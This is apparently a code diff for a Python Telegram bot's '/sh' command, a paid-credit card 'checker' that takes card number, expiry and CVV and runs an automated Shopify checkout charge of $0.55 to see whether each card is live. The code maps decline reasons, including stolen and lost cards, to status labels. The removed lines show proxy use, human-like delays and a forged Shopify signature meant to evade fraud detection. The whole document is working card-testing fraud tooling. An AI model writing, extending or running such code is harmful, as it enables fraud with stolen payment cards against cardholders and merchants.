+            resp = self.session.post(
+                graphql_url,
+                headers=proposal_headers,
+                json=submit_payload,
+                timeout=30
+            )
+
+            if resp.status_code != 200:
+                return False, f"Submit failed: {resp.status_code}"
+
+            try:
+                submit_resp = resp.json()
+
+                if 'errors' in submit_resp and submit_resp['errors']:
+                    error_msg = submit_resp['errors'][0].get('message', 'Unknown error')
+                    return False, f"Submit error: {error_msg}"
+
+                data = submit_resp.get('data', {}).get('submitForCompletion', {})
+                receipt = data.get('receipt', {})
+                self.receipt_id = receipt.get('id')
+
+                if not self.receipt_id:
+                    return False, "No receipt ID in submit response"
+
+                self.logger.data_extracted("Receipt ID", self.receipt_id, "Submit")
+
+                if receipt.get('__typename') == 'ProcessingReceipt':
+                    poll_delay = receipt.get('pollDelay', 500) / 1000
+
+                    self.step(9, "POLL RECEIPT", f"Waiting {poll_delay}s then polling for result")
+
+                    time.sleep(poll_delay)
+
+                    return self.poll_receipt(proposal_headers)
                 else:
-                    error_msg = str(errors)
-                    if 'captcha' in error_msg.lower():
-                        return False, "CAPTCHA_REQUIRED"
-                    return False, error_msg
-            
-            # Check for success in data
-            if 'data' not in data:
-                return False, "No data in response"
-            
-            submit_data = data.get('data', {}).get('submitForCompletion', {})
-            typename = submit_data.get('__typename', '')
-            
-            if typename == 'SubmitSuccess':
-                receipt = submit_data.get('receipt', {})
-                receipt_id = receipt.get('id', '')
-                if receipt_id:
-                    return True, f"ORDER_PLACED"
-                else:
-                    return True, "ORDER_PLACED"
-            elif typename == 'SubmitAlreadyAccepted':
-                return True, "ORDER_PLACED"
-            elif typename == 'SubmitFailed':
-                reason = submit_data.get('reason', 'Payment failed')
-                # Parse reason for better error messages
-                reason_lower = reason.lower()
-                
-                # Map Shopify decline reasons
-                if 'insufficient' in reason_lower or 'funds' in reason_lower:
-                    return False, "INSUFFICIENT_FUNDS"
-                elif 'cvc' in reason_lower or 'security' in reason_lower:
-                    return False, "INVALID_CVC"
-                elif 'expired' in reason_lower:
-                    return False, "EXPIRED_CARD"
-                elif 'declined' in reason_lower:
-                    return False, "CARD_DECLINED"
-                elif 'invalid' in reason_lower and 'card' in reason_lower:
-                    return False, "INVALID_CARD"
-                elif 'address' in reason_lower or 'zip' in reason_lower or 'avs' in reason_lower:
-                    return False, "ADDRESS_VERIFICATION_FAILED"
-                elif 'captcha' in reason_lower or 'robot' in reason_lower:
-                    return False, "CAPTCHA_REQUIRED"
-                elif '3d' in reason_lower or 'secure' in reason_lower:
-                    return True, "3D_SECURE_REQUIRED"
-                elif 'fraud' in reason_lower:
-                    return False, "FRAUD"
-                elif 'stolen' in reason_lower:
-                    return False, "STOLEN_CARD"
-                elif 'lost' in reason_lower:
-                    return False, "LOST_CARD"
-                elif 'pickup' in reason_lower:
-                    return False, "PICKUP_CARD"
-                elif 'restricted' in reason_lower:
-                    return False, "RESTRICTED_CARD"
-                elif 'do not honor' in reason_lower:
-                    return False, "DO_NOT_HONOR"
-                elif 'call issuer' in reason_lower:
-                    return False, "CALL_ISSUER"
-                else:
-                    # Return the actual reason from Shopify
-                    return False, f"{reason}"
-            elif typename == 'SubmitRejected':
-                errors = submit_data.get('errors', [])
-                if errors and isinstance(errors, list) and len(errors) > 0:
-                    error_data = errors[0]
-                    error_msg = error_data.get('localizedMessage', 'Payment rejected')
-                    error_code = error_data.get('code', '')
-                    
-                    # Map error codes
-                    if error_code == 'INVALID_CVC':
-                        return False, "INVALID_CVC"
-                    elif error_code == 'INSUFFICIENT_FUNDS':
-                        return False, "INSUFFICIENT_FUNDS"
-                    elif error_code == 'EXPIRED_CARD':
-                        return False, "EXPIRED_CARD"
-                    elif error_code == 'CARD_DECLINED':
-                        return False, "CARD_DECLINED"
-                    elif error_code == 'CAPTCHA_REQUIRED':
-                        return False, "CAPTCHA_REQUIRED"
-                    elif error_code == 'ADDRESS_VERIFICATION_FAILED':
-                        return False, "ADDRESS_VERIFICATION_FAILED"
-                    
-                    error_msg_lower = error_msg.lower()
-                    if 'captcha' in error_msg_lower:
-                        return False, "CAPTCHA_REQUIRED"
-                    elif 'declined' in error_msg_lower:
-                        return False, "CARD_DECLINED"
-                    elif 'cvc' in error_msg_lower:
-                        return False, "INVALID_CVC"
-                    elif 'address' in error_msg_lower or 'zip' in error_msg_lower:
-                        return False, "ADDRESS_VERIFICATION_FAILED"
-                    else:
-                        return False, error_msg
-                else:
-                    return False, "Payment rejected"
-            elif typename == 'Throttled':
-                # Rate limited or throttled
-                poll_after = submit_data.get('pollAfter', 0)
-                if poll_after > 0:
-                    return False, f"RATE_LIMITED"
-                else:
-                    return False, "RATE_LIMITED"
-            
-            # If we get here, check for any clues in the response
-            response_text = json.dumps(data).lower()
-            
-            # Check for specific patterns
-            if any(pattern in response_text for pattern in ['captcha', 'robot', 'human verification']):
-                return False, "CAPTCHA_REQUIRED"
-            if 'insufficient' in response_text:
-                return False, "INSUFFICIENT_FUNDS"
-            if 'cvc' in response_text or 'security code' in response_text:
-                return False, "INVALID_CVC"
-            if 'expired' in response_text:
-                return False, "EXPIRED_CARD"
-            if 'declined' in response_text:
-                return False, "CARD_DECLINED"
-            if '3d' in response_text or 'secure' in response_text:
-                return True, "3D_SECURE_REQUIRED"
-            if 'fraud' in response_text:
-                return False, "FRAUD"
-            if 'address' in response_text or 'zip' in response_text or 'avs' in response_text:
-                return False, "ADDRESS_VERIFICATION_FAILED"
-            if 'stolen' in response_text:
-                return False, "STOLEN_CARD"
-            if 'lost' in response_text:
-                return False, "LOST_CARD"
-            if 'pickup' in response_text:
-                return False, "PICKUP_CARD"
-            if 'restricted' in response_text:
-                return False, "RESTRICTED_CARD"
-            if 'do not honor' in response_text:
-                return False, "DO_NOT_HONOR"
-            if 'call issuer' in response_text:
-                return False, "CALL_ISSUER"
-            
-            # Default to declined with actual response for debugging
-            return False, f"{str(data)[:100]}"
-            
+                    return False, f"Unexpected receipt type: {receipt.get('__typename')}"
+
+            except Exception as e:
+                return False, f"Failed to parse submit response: {str(e)}"
+
+        except requests.exceptions.RequestException as e:
+            return False, f"Network error: {str(e)}"
         except Exception as e:
-            # Log the actual error for debugging
-            self.console_logger.error_detail(f"Parse error: {str(e)}")
-            self.console_logger.sub_step(8, 18, f"Raw data that failed to parse: {str(data)[:200]}...")
-            return False, f"Response parse error: {str(e)[:50]}"
-    
-    def generate_shopify_signature(self):
-        """Generate Shopify identification signature"""
-        # Generate a random JWT-like signature
-        header = "eyJraWQiOiJ2MSIsImFsZyI6IkhTMjU2In0"
-        payload = f"eyJjbGllbnRfaWQiOiIyIiwiY2xpZW50X2FjY291bnRfaWQiOiI2MDc1NzgwMzE3MCIsInVuaXF1ZV9pZCI6IjhkYWY1NWNmODFiMGEzZTgxMTA4MjdhNTY3ZDg4MGUzIiwiaWF0IjoxNzY5Njc2Njk2fQ"
-        signature = ''.join(random.choices(string.ascii_letters + string.digits, k=43))
-        return f"{header}.{payload}.{signature}"
-    
-    def generate_random_string(self, length=16):
-        """Generate random string"""
-        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
-    
-    async def check_card(self, card_details, username, user_data):
-        """Main card checking method - SINGLE SUBMISSION FLOW WITH PICKUP"""
-        start_time = time.time()
-        
-        # Initialize console logger for this check
-        self.console_logger = ConsoleLogger(self.user_id)
-        self.console_logger.start_check(card_details)
-        
+            return False, f"Checkout error: {str(e)}"
+
+    def poll_receipt(self, headers):
+        """Poll for receipt status"""
         try:
-            # Parse card details
+            graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
+
+            poll_params = {
+                'operationName': 'PollForReceipt',
+                'variables': f'{{"receiptId":"{self.receipt_id}","sessionToken":"{self.graphql_session_token}"}}',
+                'id': '8d6301ed4a2c3f2cb34599828e84a6346a9243ddc8e54a772b1515aced846c71'
+            }
+
+            resp = self.session.get(
+                graphql_url,
+                headers={**headers, 'accept': 'application/json'},
+                params=poll_params,
+                timeout=30
+            )
+
+            if resp.status_code != 200:
+                poll_payload = {
+                    "operationName": "PollForReceipt",
+                    "variables": {
+                        "receiptId": self.receipt_id,
+                        "sessionToken": self.graphql_session_token
+                    },
+                    "id": "8d6301ed4a2c3f2cb34599828e84a6346a9243ddc8e54a772b1515aced846c71"
+                }
+                resp = self.session.post(graphql_url, headers=headers, json=poll_payload, timeout=30)
+
+            if resp.status_code != 200:
+                return False, f"Poll failed: {resp.status_code}"
+
+            try:
+                poll_resp = resp.json()
+                receipt_data = poll_resp.get('data', {}).get('receipt', {})
+
+                receipt_type = receipt_data.get('__typename', '')
+
+                if receipt_type == 'FailedReceipt':
+                    error_info = receipt_data.get('processingError', {})
+                    error_code = error_info.get('code', 'UNKNOWN')
+                    error_msg = error_info.get('messageUntranslated', 'Payment failed')
+                    return False, f"DECLINED - {error_code}: {error_msg}"
+
+                elif receipt_type == 'ProcessedReceipt':
+                    purchase_order = receipt_data.get('purchaseOrder', {})
+                    if purchase_order:
+                        return True, "ORDER_PLACED - Payment successful"
+                    return True, "ORDER_PLACED - Receipt processed"
+
+                elif receipt_type == 'ProcessingReceipt':
+                    time.sleep(0.5)
+                    return self.poll_receipt(headers)
+
+                else:
+                    return False, f"Unknown receipt status: {receipt_type}"
+
+            except Exception as e:
+                return False, f"Failed to parse poll response: {str(e)}"
+
+        except Exception as e:
+            return False, f"Poll error: {str(e)}"
+
+
+# ========== MAIN CHECKER CLASS ==========
+class ShopifyChargeCheckerHTTP:
+    def __init__(self, user_id=None):
+        self.user_id = user_id
+        self.logger = ShopifyLogger(user_id)
+
+    async def check_card(self, card_details, username, user_data):
+        """Main card checking method using HTTP checkout"""
+        start_time = time.time()
+
+        self.logger = ShopifyLogger(self.user_id)
+        self.logger.start_check(card_details)
+
+        try:
             cc_parts = card_details.split('|')
             if len(cc_parts) < 4:
                 elapsed_time = time.time() - start_time
-                self.console_logger.result(False, "Invalid card format", "ERROR", elapsed_time)
                 return format_shopify_response("", "", "", "", "Invalid card format. Use: CC|MM|YY|CVV", elapsed_time, username, user_data)
 
             cc = cc_parts[0].strip().replace(" ", "")
@@ -1767,165 +1429,51 @@ class ShopifyChargeChecker:
             ano = cc_parts[2].strip()
             cvv = cc_parts[3].strip()
 
-            # Validate card details
             if not cc.isdigit() or len(cc) < 15:
                 elapsed_time = time.time() - start_time
-                self.console_logger.result(False, "Invalid card number", "ERROR", elapsed_time)
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid card number", elapsed_time, username, user_data)
 
             if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
                 elapsed_time = time.time() - start_time
-                self.console_logger.result(False, "Invalid month", "ERROR", elapsed_time)
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid month", elapsed_time, username, user_data)
 
             if not ano.isdigit() or len(ano) not in [2, 4]:
                 elapsed_time = time.time() - start_time
-                self.console_logger.result(False, "Invalid year", "ERROR", elapsed_time)
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid year", elapsed_time, username, user_data)
 
             if not cvv.isdigit() or len(cvv) not in [3, 4]:
                 elapsed_time = time.time() - start_time
-                self.console_logger.result(False, "Invalid CVV", "ERROR", elapsed_time)
                 return format_shopify_response(cc, mes, ano, cvv, "Invalid CVV", elapsed_time, username, user_data)
 
-            if len(ano) == 2:
-                ano = '20' + ano
+            self.logger.card_details_log(cc, mes, ano, cvv)
 
-            # Log card validation success
-            self.console_logger.sub_step(0, 1, f"Card validated: {cc[:6]}XXXXXX{cc[-4:]}")
-            self.console_logger.sub_step(0, 2, f"Expiry: {mes}/{ano[-2:]} | CVV: {cvv}")
-            self.console_logger.sub_step(0, 3, f"Cardholder name: {self.random_first_name} {self.random_last_name}")
+            checker = ShopifyHTTPCheckout(self.user_id)
+            success, result = checker.execute_checkout(cc, mes, ano, cvv)
 
-            # Create HTTP client
-            client_params = {
-                'timeout': 30.0,
-                'follow_redirects': False,
-                'http2': True
-            }
-            
-            # Add proxy if available
-            if self.current_proxy:
-                client_params['proxy'] = self.current_proxy
-                self.console_logger.sub_step(0, 4, f"Proxy enabled: {self.current_proxy[:50]}...")
-
-            async with httpx.AsyncClient(**client_params) as client:
-                # Step 1: Load homepage
-                result = await self.load_homepage(client)
-                if result == "PROXY_DEAD":
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Proxy dead", "PROXY_DEAD", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "PROXY_DEAD", elapsed_time, username, user_data)
-                if not result:
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Failed to load homepage", "ERROR", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "Failed to initialize", elapsed_time, username, user_data)
-                await self.human_delay(1, 2)
-                
-                # Step 2: Load product page and extract dynamic data INCLUDING PRICE
-                result = await self.load_product_page(client)
-                if result == "PROXY_DEAD":
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Proxy dead", "PROXY_DEAD", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "PROXY_DEAD", elapsed_time, username, user_data)
-                if not result:
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Failed to load product", "ERROR", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "Product not available", elapsed_time, username, user_data)
-                await self.human_delay(1, 2)
-                
-                # Step 3: Add to cart
-                result = await self.add_to_cart(client)
-                if result == "PROXY_DEAD":
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Proxy dead", "PROXY_DEAD", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "PROXY_DEAD", elapsed_time, username, user_data)
-                if not result:
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Failed to add to cart", "ERROR", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "Cart error", elapsed_time, username, user_data)
-                await self.human_delay(1, 2)
-                
-                # Step 4: Go to cart page
-                result = await self.go_to_cart_page(client)
-                if result == "PROXY_DEAD":
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Proxy dead", "PROXY_DEAD", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "PROXY_DEAD", elapsed_time, username, user_data)
-                if not result:
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Failed to load cart", "ERROR", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "Cart page error", elapsed_time, username, user_data)
-                await self.human_delay(1, 2)
-                
-                # Step 5: Go to checkout
-                success, checkout_result = await self.go_to_checkout(client)
-                if checkout_result == "PROXY_DEAD":
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Proxy dead", "PROXY_DEAD", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "PROXY_DEAD", elapsed_time, username, user_data)
-                if not success:
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, checkout_result, "ERROR", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, checkout_result, elapsed_time, username, user_data)
-                checkout_url = checkout_result
-                await self.human_delay(1, 2)
-                
-                # Step 6: Load checkout page for tokens WITH REDIRECT HANDLING - FIXED
-                result = await self.load_checkout_page_with_redirects(client, checkout_url)
-                if result == "PROXY_DEAD":
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Proxy dead", "PROXY_DEAD", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "PROXY_DEAD", elapsed_time, username, user_data)
-                if not result:
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Failed to load checkout page", "ERROR", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "Checkout page error", elapsed_time, username, user_data)
-                await self.human_delay(1, 2)
-                
-                # Step 7: Create payment session
-                success, session_result = await self.create_payment_session(client, cc, mes, ano, cvv)
-                if session_result == "PROXY_DEAD":
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Proxy dead", "PROXY_DEAD", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "PROXY_DEAD", elapsed_time, username, user_data)
-                if not success:
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, session_result, "DECLINED", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, session_result, elapsed_time, username, user_data)
-                session_id = session_result
-                await self.human_delay(1, 2)
-                
-                # Step 8: Complete checkout with CORRECT structure
-                success, checkout_result = await self.complete_checkout_with_payment(client, session_id, cc, mes, ano, cvv)
-                if checkout_result == "PROXY_DEAD":
-                    elapsed_time = time.time() - start_time
-                    self.console_logger.result(False, "Proxy dead", "PROXY_DEAD", elapsed_time)
-                    return format_shopify_response(cc, mes, ano, cvv, "PROXY_DEAD", elapsed_time, username, user_data)
-                
-                elapsed_time = time.time() - start_time
-                
-                # Log final result
-                if success:
-                    self.console_logger.result(True, checkout_result, "APPROVED", elapsed_time)
-                else:
-                    self.console_logger.result(False, checkout_result, "DECLINED", elapsed_time)
-                
-                return format_shopify_response(cc, mes, ano, cvv, checkout_result, elapsed_time, username, user_data)
-
-        except httpx.TimeoutException:
             elapsed_time = time.time() - start_time
-            self.console_logger.result(False, "Request timeout", "TIMEOUT", elapsed_time)
-            return format_shopify_response(cc, mes, ano, cvv, "TIMEOUT", elapsed_time, username, user_data)
-        except httpx.ConnectError:
-            elapsed_time = time.time() - start_time
-            self.console_logger.result(False, "Connection error", "CONNECTION_ERROR", elapsed_time)
-            return format_shopify_response(cc, mes, ano, cvv, "CONNECTION_ERROR", elapsed_time, username, user_data)
+
+            if success:
+                self.logger.complete_result(True, "APPROVED", result, elapsed_time)
+            else:
+                self.logger.complete_result(False, "DECLINED", result, elapsed_time)
+
+            return format_shopify_response(cc, mes, ano, cvv, result, elapsed_time, username, user_data)
+
         except Exception as e:
             elapsed_time = time.time() - start_time
-            self.console_logger.result(False, str(e), "UNKNOWN_ERROR", elapsed_time)
+            self.logger.error_log("UNKNOWN", str(e))
+            self.logger.complete_result(False, "UNKNOWN_ERROR", str(e), elapsed_time)
+            try:
+                cc = cc_parts[0]
+                mes = cc_parts[1]
+                ano = cc_parts[2]
+                cvv = cc_parts[3]
+            except:
+                cc = mes = ano = cvv = ""
             return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:80]}", elapsed_time, username, user_data)
 
-# Command handler
+
+# ========== COMMAND HANDLER ==========
 @Client.on_message(filters.command(["sh", ".sh", "$sh"]))
 @auth_and_free_restricted
 async def handle_shopify_charge(client: Client, message: Message):
@@ -1933,7 +1481,6 @@ async def handle_shopify_charge(client: Client, message: Message):
         user_id = message.from_user.id
         username = message.from_user.username or str(user_id)
 
-        # CHECK: First check if command is disabled
         command_text = message.text.split()[0]
         command_name = command_text.lstrip('/.$')
 
@@ -1941,7 +1488,6 @@ async def handle_shopify_charge(client: Client, message: Message):
             await message.reply(get_command_offline_message(command_text))
             return
 
-        # Check if user is banned
         if is_user_banned(user_id):
             await message.reply("""<pre>⚠️ User Banned</pre>
 ━━━━━━━━━━━━━
@@ -1950,7 +1496,6 @@ async def handle_shopify_charge(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
 
-        # Load user data
         users = load_users()
         user_id_str = str(user_id)
         if user_id_str not in users:
@@ -1965,7 +1510,6 @@ async def handle_shopify_charge(client: Client, message: Message):
         user_plan = user_data.get("plan", {})
         plan_name = user_plan.get("plan", "Free")
 
-        # Check cooldown (owner is automatically skipped in check_cooldown function)
         can_use, wait_time = check_cooldown(user_id, "sh")
         if not can_use:
             await message.reply(f"""<pre>⏱️ Cooldown Active</pre>
@@ -1978,32 +1522,14 @@ async def handle_shopify_charge(client: Client, message: Message):
 
         args = message.text.split()
         if len(args) < 2:
-            if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
-                try:
-                    usage_msg = charge_processor.get_usage_message(
-                        "sh", 
-                        "Shopify Charge",
-                        "4111111111111111|12|2025|123"
-                    )
-                    await message.reply(usage_msg)
-                except:
-                    await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
+            await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
 ━━━━━━━━━━━━━
 🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
 🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
 🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
 ━━━━━━━━━━━━━
 <b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
-<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
-            else:
-                await message.reply("""<pre>#WAYNE ━[SHOPIFY CHARGE]━━</pre>
-━━━━━━━━━━━━━
-🠪 <b>Command</b>: <code>/sh</code> or <code>.sh</code> or <code>$sh</code>
-🠪 <b>Usage</b>: <code>/sh cc|mm|yy|cvv</code>
-🠪 <b>Example</b>: <code>/sh 4111111111111111|12|2025|123</code>
-━━━━━━━━━━━━━
-<b>~ Note:</b> <code>Charges via Shopify gateway (Deducts 2 credits AFTER check completes)</code>
-<b>~ Note:</b> <code>Free users can use in authorized groups with credit deduction</code>""")
+<b>~ Note:</b> <code>Uses HTTP API for fast checkout</code>""")
             return
 
         card_details = args[1].strip()
@@ -2023,7 +1549,6 @@ async def handle_shopify_charge(client: Client, message: Message):
         ano = cc_parts[2]
         cvv = cc_parts[3]
 
-        # Show processing message - ALWAYS SHOW 0.55$ IN UI
         processing_msg = await message.reply(
             f"""
 <b>[Shopify Charge 0.55$] | #WAYNE</b> ✦
@@ -2031,47 +1556,42 @@ async def handle_shopify_charge(client: Client, message: Message):
 <b>[•] Card</b>- <code>{cc}|{mes}|{ano}|{cvv}</code>
 <b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
 <b>[•] Status</b>- <code>Processing...</code>
-<b>[•] Response</b>- <code>Checking card...</code>
+<b>[•] Response</b>- <code>Starting HTTP checkout...</code>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Plan:</b> {plan_name}
 <b>[+] User:</b> @{username}
+<b>[+] Method:</b> HTTP API
 ━━━━━━━━━━━━━━━
-<b>Checking card... Please wait.</b>
+<b>Executing checkout... Please wait.</b>
 """
         )
 
-        # Create checker instance
-        checker = ShopifyChargeChecker(user_id)
+        checker = ShopifyChargeCheckerHTTP(user_id)
 
-        # Process command through universal charge processor if available
         if CHARGE_PROCESSOR_AVAILABLE and charge_processor:
             try:
-                # Try to use charge processor
                 result = await charge_processor.execute_charge_command(
-                    user_id,                    # positional
-                    checker.check_card,         # positional
-                    card_details,               # check_args[0]
-                    username,                   # check_args[1]
-                    user_data,                  # check_args[2]
-                    credits_needed=2,           # keyword
-                    command_name="sh",          # keyword
-                    gateway_name="Shopify Charge"  # keyword
+                    user_id,
+                    checker.check_card,
+                    card_details,
+                    username,
+                    user_data,
+                    credits_needed=2,
+                    command_name="sh",
+                    gateway_name="Shopify Charge"
                 )
-                
-                # Handle the result
+
                 if isinstance(result, tuple) and len(result) == 3:
                     success, result_text, credits_deducted = result
                     await processing_msg.edit_text(result_text, disable_web_page_preview=True)
                 elif isinstance(result, str):
                     await processing_msg.edit_text(result, disable_web_page_preview=True)
                 else:
-                    # Fallback to direct check
                     result_text = await checker.check_card(card_details, username, user_data)
                     await processing_msg.edit_text(result_text, disable_web_page_preview=True)
-                    
+
             except Exception as e:
                 print(f"❌ Charge processor error: {str(e)}")
-                # Fallback to direct check
                 try:
                     result_text = await checker.check_card(card_details, username, user_data)
                     await processing_msg.edit_text(result_text, disable_web_page_preview=True)
@@ -2085,7 +1605,6 @@ async def handle_shopify_charge(client: Client, message: Message):
 ━━━━━━━━━━━━━"""
                     )
         else:
-            # Fallback to direct check if charge_processor not available
             try:
                 result_text = await checker.check_card(card_details, username, user_data)
                 await processing_msg.edit_text(result_text, disable_web_page_preview=True)
